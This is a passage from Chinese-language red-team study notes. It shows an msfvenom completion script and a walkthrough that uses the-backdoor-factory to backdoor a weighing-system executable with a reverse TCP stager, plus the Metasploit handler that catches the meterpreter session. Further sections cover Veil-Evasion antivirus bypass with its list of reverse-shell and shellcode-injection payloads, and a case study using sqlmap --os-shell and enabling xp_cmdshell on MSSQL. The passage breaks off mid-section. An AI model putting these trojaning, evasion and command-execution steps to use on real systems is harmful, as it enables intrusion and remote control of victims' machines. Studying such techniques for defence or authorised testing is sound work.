<span class="token function">__msfvenom_platforms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local platforms
platforms<span class="token operator">=</span><span class="token punctuation">(</span>
<span class="token string">'aix'</span>
<span class="token string">'android'</span>
<span class="token string">'apple_ios'</span>
<span class="token string">'bsd'</span>
<span class="token string">'bsdi'</span>
<span class="token string">'cisco'</span>
<span class="token string">'firefox'</span>
<span class="token string">'freebsd'</span>
<span class="token string">'hardware'</span>
<span class="token string">'hpux'</span>
<span class="token string">'irix'</span>
<span class="token string">'java'</span>
<span class="token string">'javascript'</span>
<span class="token string">'juniper'</span>
<span class="token string">'linux'</span>
<span class="token string">'mainframe'</span>
<span class="token string">'multi'</span>
<span class="token string">'netbsd'</span>
<span class="token string">'netware'</span>
<span class="token string">'nodejs'</span>
<span class="token string">'openbsd'</span>
<span class="token string">'osx'</span>
<span class="token string">'php'</span>
<span class="token string">'python'</span>
<span class="token string">'r'</span>
<span class="token string">'ruby'</span>
<span class="token string">'solaris'</span>
<span class="token string">'unix'</span>
<span class="token string">'unknown'</span>
<span class="token string">'windows'</span>
<span class="token punctuation">)</span>

<span class="token keyword">for</span> line in $platforms<span class="token punctuation">;</span> <span class="token keyword">do</span>
echo <span class="token string">"$line"</span>
done
<span class="token punctuation">}</span> 

<span class="token function">__msfvenom_formats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local formats
formats<span class="token operator">=</span><span class="token punctuation">(</span>
<span class="token string">'asp'</span>
<span class="token string">'aspx'</span>
<span class="token string">'aspx‐exe'</span>
<span class="token string">'axis2'</span>
<span class="token string">'dll'</span>
<span class="token string">'elf'</span>
<span class="token string">'elf‐so'</span>
<span class="token string">'exe'</span>
<span class="token string">'exe‐only'</span>
<span class="token string">'exe‐service'</span>
<span class="token string">'exe‐small'</span>
<span class="token string">'hta‐psh'</span>
<span class="token string">'jar'</span>
<span class="token string">'jsp'</span>
<span class="token string">'loop‐vbs'</span>
<span class="token string">'macho'</span>
<span class="token string">'msi'</span>
<span class="token string">'msi‐nouac'</span>
<span class="token string">'osx‐app'</span>
<span class="token string">'psh'</span>
<span class="token string">'psh‐cmd'</span>
<span class="token string">'psh‐net'</span>
<span class="token string">'psh‐reflection'</span>
<span class="token string">'vba'</span>
<span class="token string">'vba‐exe'</span>
<span class="token string">'vba‐psh'</span>
<span class="token string">'vbs'</span>
<span class="token string">'war'</span>
<span class="token string">'bash'</span>
<span class="token string">'c'</span>
<span class="token string">'csharp'</span>
<span class="token string">'dw'</span>
<span class="token string">'dword'</span>
<span class="token string">'hex'</span>
<span class="token string">'java'</span>
<span class="token string">'js_be'</span>
<span class="token string">'js_le'</span>
<span class="token string">'num'</span>
<span class="token string">'perl'</span>
<span class="token string">'pl'</span>
<span class="token string">'powershell'</span>
<span class="token string">'ps1'</span>
<span class="token string">'py'</span>
<span class="token string">'python'</span>
<span class="token string">'raw'</span>
<span class="token string">'rb'</span>
<span class="token string">'ruby'</span>
<span class="token string">'sh'</span>
<span class="token string">'vbapplication'</span>
<span class="token string">'vbscript'</span>
<span class="token punctuation">)</span>

<span class="token keyword">for</span> line in $formats<span class="token punctuation">;</span> <span class="token keyword">do</span>
echo <span class="token string">"$line"</span>
done
<span class="token punctuation">}</span> 

<span class="token macro property"># For most common options, not accurately</span>
<span class="token function">__msfvenom_options</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
local options
options<span class="token operator">=</span><span class="token punctuation">(</span>
LHOST<span class="token operator">=</span> \
LPORT<span class="token operator">=</span> \
EXITFUNC<span class="token operator">=</span> \
RHOST<span class="token operator">=</span> \
StageEncoder<span class="token operator">=</span> \
AutoLoadStdapi<span class="token operator">=</span> \
AutoRunScript<span class="token operator">=</span> \
AutoSystemInfo<span class="token operator">=</span> \
AutoVerifySession<span class="token operator">=</span> \
AutoVerifySessionTimeout<span class="token operator">=</span> \
EnableStageEncoding<span class="token operator">=</span> \
EnableUnicodeEncoding<span class="token operator">=</span> \
HandlerSSLCert<span class="token operator">=</span> \
InitialAutoRunScript<span class="token operator">=</span> \
PayloadBindPort<span class="token operator">=</span> \
PayloadProcessCommandLine<span class="token operator">=</span> \
PayloadUUIDName<span class="token operator">=</span> \
PayloadUUIDRaw<span class="token operator">=</span> \
PayloadUUIDSeed<span class="token operator">=</span> \
PayloadUUIDTracking<span class="token operator">=</span> \
PrependMigrate<span class="token operator">=</span> \
PrependMigrateProc<span class="token operator">=</span> \
ReverseAllowProxy<span class="token operator">=</span> \
ReverseListenerBindAddress<span class="token operator">=</span> \
ReverseListenerBindPort<span class="token operator">=</span> \
ReverseListenerComm<span class="token operator">=</span> \
ReverseListenerThreaded<span class="token operator">=</span> \
SessionCommunicationTimeout<span class="token operator">=</span> \
SessionExpirationTimeout<span class="token operator">=</span> \
SessionRetryTotal<span class="token operator">=</span> \
SessionRetryWait<span class="token operator">=</span> \
StageEncoder<span class="token operator">=</span> \
StageEncoderSaveRegisters<span class="token operator">=</span> \
StageEncodingFallback<span class="token operator">=</span> \
StagerRetryCount<span class="token operator">=</span> \
StagerRetryWait<span class="token operator">=</span> \
VERBOSE<span class="token operator">=</span> \
WORKSPACE<span class="token operator">=</span>
<span class="token punctuation">)</span> 

echo $options
<span class="token punctuation">}</span>

#_msfvenom <span class="token string">"$@"</span>
</code></pre>
<hr>
<h2><a id="122_Thebackdoorfactory_3420"></a>12.2 The-backdoor-factory-工具介绍</h2>
<p><strong>原理</strong></p>
<p>可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在程序执行的时候，jmp 到代码段，来触发 payload。</p>
<p><strong>以项目中的过磅系统为例：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>secretsquirrel<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory<span class="token punctuation">.</span>git
<span class="token comment">//安装the-backdoor-factory</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010234957555.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# <span class="token punctuation">.</span><span class="token operator">/</span>backdoor<span class="token punctuation">.</span>py <span class="token operator">-</span>f <span class="token operator">~</span><span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">-</span>S
<span class="token comment">//检测是否支持后门植入</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235008394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# <span class="token punctuation">.</span><span class="token operator">/</span>backdoor<span class="token punctuation">.</span>py <span class="token operator">-</span>f <span class="token operator">~</span><span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">-</span>c <span class="token operator">-</span>l <span class="token number">150</span>
<span class="token comment">//测试裂缝空间size150</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235023964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# <span class="token punctuation">.</span><span class="token operator">/</span>backdoor<span class="token punctuation">.</span>py <span class="token operator">-</span>f <span class="token operator">~</span><span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">-</span>s show
<span class="token comment">//查看可用payload</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235035559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# <span class="token punctuation">.</span><span class="token operator">/</span>backdoor<span class="token punctuation">.</span>py <span class="token operator">-</span>f <span class="token operator">~</span><span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">-</span>H <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.111</span> <span class="token operator">-</span>P <span class="token number">8080</span> <span class="token operator">-</span>s iat_reverse_tcp_stager_threaded
<span class="token comment">//插入payload，并生成文件。</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235049612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# md5sum <span class="token punctuation">.</span><span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">/</span>root<span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe
<span class="token comment">//对比原文件与生成文件MD5值</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101023510979.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>the<span class="token operator">-</span>backdoor<span class="token operator">-</span>factory# du <span class="token operator">-</span>k <span class="token punctuation">.</span><span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe <span class="token operator">/</span>root<span class="token operator">/</span>demo<span class="token operator">/</span>guobang<span class="token punctuation">.</span>exe
<span class="token comment">//对比文件大小</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235116292.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lhost <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.111</span>
lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.111</span>
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lport <span class="token number">8080</span>
lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">8080</span>
msf <span class="token function">exploit</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span class="token operator">-</span>j 
<span class="token comment">//开启本地监听</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010235128451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
//打开软件<br>
<img src="https://img-blog.csdnimg.cn/20201010235133684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John<span class="token operator">-</span>PC\John
</code></pre>
<p>//确定目标<br>
<img src="https://img-blog.csdnimg.cn/2020101023515311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="123_VeilEvasiondayuTwentyfifth_days_3493"></a>12.3 Veil-Evasion-工具介绍（dayu-Twenty-fifth days）</h2>
<p><strong>项目地址：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Veil<span class="token operator">-</span>Framework<span class="token operator">/</span>Veil<span class="token operator">-</span>Evasion
</code></pre>
<p><strong>1、Veil-Evasion</strong></p>
<p>Veil-Evasion 是与 Metasploit 生成相兼容的 Payload 的一款辅助框架，并可以绕过大多数的杀软。</p>
<p>Veil-Evasion 并没有集成在kali，配置 sources.list，可直接 apt-get。</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Deskto#cat <span class="token operator">/</span>etc<span class="token operator">/</span>apt<span class="token operator">/</span>sources<span class="token punctuation">.</span>list

#中科大
deb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib
deb<span class="token operator">-</span>src http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>mirrors<span class="token punctuation">.</span>ustc<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib
#阿里云
<span class="token macro property">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span>
<span class="token macro property">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span>
#清华大学
<span class="token macro property">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span>
<span class="token macro property">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span>
#浙大
<span class="token macro property">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span>
<span class="token macro property">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span>
#东软大学
<span class="token macro property">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span>
<span class="token macro property">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span>
#官方源
deb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>http<span class="token punctuation">.</span>kali<span class="token punctuation">.</span>org<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib
deb<span class="token operator">-</span>src http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>http<span class="token punctuation">.</span>kali<span class="token punctuation">.</span>org<span class="token operator">/</span>kali kali<span class="token operator">-</span>rolling main non<span class="token operator">-</span>free contrib
#重庆大学
<span class="token macro property">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span>
<span class="token macro property">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span>
</code></pre>
<p><strong>2、安装</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# apt<span class="token operator">-</span>get install veil<span class="token operator">-</span>evasion
</code></pre>
<p>由于在实验中本机已经安装，所以我们在虚拟机中使用 git 方式来下载和安装。（以便截图）<br>
ps:本次 kali 下截图使用 scrot</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Deskto# apt<span class="token operator">-</span>get install scrot
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Deskto# scrot <span class="token operator">-</span>s <span class="token comment">//即可</span>
root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Deskto# git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Veil<span class="token operator">-</span>Framework<span class="token operator">/</span>Veil<span class="token operator">-</span>Evasion<span class="token punctuation">.</span>git
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201011204253133.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>Veil<span class="token operator">-</span>Evasion# <span class="token punctuation">.</span><span class="token operator">/</span>setup<span class="token punctuation">.</span>sh
<span class="token comment">//安装漫长</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201011204310950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201011204318684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201011204327212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、测试</strong></p>
<p>以 c/meterpreter/rev_tcp 为例：<br>
<img src="https://img-blog.csdnimg.cn/20201011204344800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201011204350864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
ps:Veil-Evasion 不再更新，新版本项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Veil<span class="token operator">-</span>Framework<span class="token operator">/</span>Veil
</code></pre>
<p><strong>4、附录：</strong></p>
<pre><code class="prism language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 可支持生成payloads<span class="token punctuation">:</span>  
<span class="token number">1</span><span class="token punctuation">)</span> auxiliary<span class="token operator">/</span>coldwar_wrapper  
<span class="token number">2</span><span class="token punctuation">)</span> auxiliary<span class="token operator">/</span>macro_converter  
<span class="token number">3</span><span class="token punctuation">)</span> auxiliary<span class="token operator">/</span>pyinstaller_wrapper  
<span class="token number">4</span><span class="token punctuation">)</span> c<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">5</span><span class="token punctuation">)</span> c<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http_service  
<span class="token number">6</span><span class="token punctuation">)</span> c<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">7</span><span class="token punctuation">)</span> c<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp_service  
<span class="token number">8</span><span class="token punctuation">)</span> c<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>flatc  
<span class="token number">9</span><span class="token punctuation">)</span> cs<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">10</span><span class="token punctuation">)</span> cs<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https  
<span class="token number">11</span><span class="token punctuation">)</span> cs<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">12</span><span class="token punctuation">)</span> cs<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>base64_substitution  
<span class="token number">13</span><span class="token punctuation">)</span> cs<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>virtual  
<span class="token number">14</span><span class="token punctuation">)</span> go<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">15</span><span class="token punctuation">)</span> go<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https  
<span class="token number">16</span><span class="token punctuation">)</span> go<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">17</span><span class="token punctuation">)</span> go<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>virtual  
<span class="token number">18</span><span class="token punctuation">)</span> native<span class="token operator">/</span>backdoor_factory  
<span class="token number">19</span><span class="token punctuation">)</span> native<span class="token operator">/</span>hyperion  
<span class="token number">20</span><span class="token punctuation">)</span> native<span class="token operator">/</span>pe_scrambler  
<span class="token number">21</span><span class="token punctuation">)</span> perl<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>flat  
<span class="token number">22</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">23</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https  
<span class="token number">24</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">25</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>download_virtual  
<span class="token number">26</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>download_virtual_https  
<span class="token number">27</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>psexec_virtual  
<span class="token number">28</span><span class="token punctuation">)</span> powershell<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>virtual  
<span class="token number">29</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp  
<span class="token number">30</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">31</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http_contained  
<span class="token number">32</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https  
<span class="token number">33</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https_contained  
<span class="token number">34</span><span class="token punctuation">)</span> python<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">35</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>aes_encrypt  
<span class="token number">36</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>aes_encrypt_HTTPKEY_Request  
<span class="token number">37</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>arc_encrypt  
<span class="token number">38</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>base64_substitution  
<span class="token number">39</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>des_encrypt  
<span class="token number">40</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>download_inject  
<span class="token number">41</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>flat  
<span class="token number">42</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>letter_substitution  
<span class="token number">43</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>pidinject  
<span class="token number">44</span><span class="token punctuation">)</span> python<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>stallion  
<span class="token number">45</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http  
<span class="token number">46</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_http_contained  
<span class="token number">47</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https  
<span class="token number">48</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_https_contained  
<span class="token number">49</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>meterpreter<span class="token operator">/</span>rev_tcp  
<span class="token number">50</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>base64  
<span class="token number">51</span><span class="token punctuation">)</span> ruby<span class="token operator">/</span>shellcode_inject<span class="token operator">/</span>flat
</code></pre>
<hr>
<h2><a id="124_CyberChef_3622"></a>12.4 离线CyberChef使用指南</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>secrss<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span><span class="token number">12449</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>kalistudy<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span><span class="token number">16</span><span class="token operator">/</span>安全工具：cyberchef（离线加密、编解码、排版工具）<span class="token operator">/</span>
</code></pre>
<p>书上详细介绍了8中使用场景和方法…</p>
<hr>
<h1><a id="_3633"></a>十三、红队案例分析</h1>
<h2><a id="131_Regsvr32_ole_3634"></a>13.1 某次项目技术点实录-Regsvr32 ole对象</h2>
<p><strong>由于环境都无法进行演示，目前取得都是历史留存的截图</strong></p>
<p><strong>1、突破口</strong></p>
<p>一开始是一个外网的SQL注入，通过sqlmap正常操作，得知是DBA权限，数据库：MSSQL</p>
<pre><code class="prism language-c">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://xxx.com/xxx/xxx.aspx?yum=xx&amp;xx=xx"</span> <span class="token operator">-</span>p yhm <span class="token operator">--</span>random<span class="token operator">-</span>agent <span class="token operator">--</span>cookie<span class="token operator">=</span><span class="token string">'ASP.NET_SessionId=xxxx'</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201011210203870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>直接通过<code>--os-shell</code>来执行命令：</p>
<pre><code class="prism language-c"><span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> checking <span class="token keyword">if</span> xp_cmdshell extended procedure is available<span class="token punctuation">,</span> please wait<span class="token punctuation">.</span><span class="token punctuation">.</span>
xp_cmdshell extended procedure does not seem to be available<span class="token punctuation">.</span> Do you want sqlmap to try to re<span class="token operator">-</span>enable it<span class="token operator">?</span> <span class="token punctuation">[</span>Y<span class="token operator">/</span>n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> xp_cmdshell re<span class="token operator">-</span>enabling failed
</code></pre>
<p><strong>启用xp_cmdshell</strong></p>
<p><strong>手动启动语句：</strong></p>
<pre><code class="prism language-c">EXEC sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>RECONFIGURE<span class="token punctuation">;</span>EXEC sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>RECONFIGURE<span class="token punctuation">;</span>
</code></pre>
<p><strong>执行：</strong></p>
<pre><code class="prism language-c">exec master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">"whoami"</span>
</code></pre>
<p><strong>启用OLE Automation</strong><br>
